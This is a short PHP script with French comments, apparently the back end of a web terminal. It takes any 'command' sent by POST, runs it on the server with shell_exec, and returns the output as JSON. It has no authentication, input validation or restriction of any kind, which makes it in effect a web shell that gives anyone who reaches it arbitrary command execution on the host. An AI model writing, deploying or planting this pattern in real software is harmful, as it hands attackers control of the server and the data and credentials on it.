<?php
header('Content-Type: application/json');

// Récupère la commande envoyée par le terminal web
$command = $_POST['command'] ?? '';

$output = '';
$status = 'error';

if ($command) {
    // Exécute la commande sur le serveur et récupère la sortie
    $output = shell_exec($command . ' 2>&1');
    $status = 'ok';
}

// Retourne le résultat au terminal en JSON
echo json_encode([
    'status' => $status,
    'output' => $output
]);
?>
